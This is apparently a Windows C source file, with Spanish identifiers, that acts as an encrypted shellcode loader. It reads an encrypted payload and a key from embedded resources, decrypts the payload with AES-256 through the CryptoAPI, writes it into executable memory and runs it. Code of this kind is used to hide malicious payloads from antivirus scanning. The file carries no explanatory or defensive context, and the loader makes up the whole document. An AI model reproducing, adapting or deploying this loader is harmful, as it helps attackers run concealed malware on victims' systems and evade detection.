#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")

#define IDI_BIN1 101
#define IDI_BIN2 102

void Desencriptar(char* sc, DWORD scLen, char* k, DWORD kLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return;
    }
    
    CryptHashData(hHash, (BYTE*)k, kLen, 0);
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return;
    }

    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)sc, &scLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

int main() {

	HRSRC scResource = FindResource(NULL, MAKEINTRESOURCE(IDI_BIN1), "BIN1");
	DWORD scSize = SizeofResource(NULL, scResource);
	HGLOBAL scResourceData = LoadResource(NULL, scResource);

    HRSRC kResource = FindResource(NULL, MAKEINTRESOURCE(IDI_BIN2), "BIN2");
    DWORD kSize = SizeofResource(NULL, kResource);
    HGLOBAL kResourceData = LoadResource(NULL, kResource);

	Desencriptar((char*)scResourceData, scSize, (char*)kResourceData, kSize);

	void *pSc = VirtualAlloc(0, scSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pSc, scResourceData, scSize);
	((void(*)())pSc)();

	return 0;
}